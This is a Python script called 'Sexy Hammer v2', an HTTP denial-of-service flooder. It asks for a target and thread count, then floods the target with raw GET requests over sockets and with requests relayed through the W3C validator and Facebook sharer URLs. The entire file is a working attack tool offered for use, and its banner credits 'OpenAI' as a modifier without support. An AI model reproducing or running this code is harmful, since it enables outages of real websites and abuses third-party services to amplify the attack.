#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket, threading, time, random, sys, urllib.request
from queue import Queue

# 🔧 Default User-Agents
uagents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Linux; Android 10)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
]

# 💥 Default bots for GET hammer
bots = [
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
]

q, w = Queue(), Queue()
sent_packets = 0

def load_headers():
    try:
        with open("headers.txt", "r") as f:
            return f.read()
    except:
        return "User-Agent: {}\n".format(random.choice(uagents))

data = load_headers()

def bot_hammer(url):
    global sent_packets
    try:
        while True:
            req = urllib.request.urlopen(
                urllib.request.Request(url, headers={'User-Agent': random.choice(uagents)}))
            sent_packets += 1
            print("🤖 bot hammering...")
            time.sleep(0.1)
    except:
        time.sleep(0.1)

def down_it(item, host, port):
    global sent_packets
    try:
        while True:
            packet = str("GET / HTTP/1.1\nHost: {}\n\n{}\n".format(host, data)).encode('utf-8')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            s.send(packet)
            sent_packets += 1
            print(f"🔥 [{time.ctime()}] Packet sent!")
            s.shutdown(socket.SHUT_WR)
            time.sleep(0.1)
    except:
        print("❌ Connection error!")
        time.sleep(0.1)

def dos(host, port):
    while True:
        item = q.get()
        down_it(item, host, port)
        q.task_done()

def dos2(host):
    while True:
        item = w.get()
        bot_hammer(random.choice(bots) + "http://" + host)
        w.task_done()

def check_host(host, port):
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect((host, port))
        s.close()
        return True
    except:
        return False

def run_attack(host, port, turbo, duration):
    print(f"\n🚀 Launching Attack on {host}:{port}")
    print(f"💨 Threads: {turbo} | ⏰ Duration: {duration} sec\n")
    time.sleep(2)

    for i in range(turbo):
        t = threading.Thread(target=dos, args=(host, port))
        t.daemon = True
        t.start()
        t2 = threading.Thread(target=dos2, args=(host,))
        t2.daemon = True
        t2.start()

    start_time = time.time()
    item = 0

    while True:
        if time.time() - start_time > duration:
            break
        item += 1
        q.put(item)
        w.put(item)
        time.sleep(0.01)

    q.join()
    w.join()
    print(f"\n✅ Attack Complete! Total Packets Sent: {sent_packets} 🔥")

def main():
    print("🔨 Sexy Hammer v2 🔥 [By OpenAI Modified]")
    host = input("🌐 Target IP or Domain: ").strip()
    port = input("🔌 Port [default 80]: ").strip()
    turbo = input("⚙️ Threads [default 135]: ").strip()
    duration = input("⏰ Duration in seconds [default 60]: ").strip()

    host = host if host else "127.0.0.1"
    port = int(port) if port.isdigit() else 80
    turbo = int(turbo) if turbo.isdigit() else 135
    duration = int(duration) if duration.isdigit() else 60

    if not check_host(host, port):
        print("🚫 Target unreachable. Please check IP/Port.")
        return

    run_attack(host, port, turbo, duration)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n❗ Attack Aborted by User.")
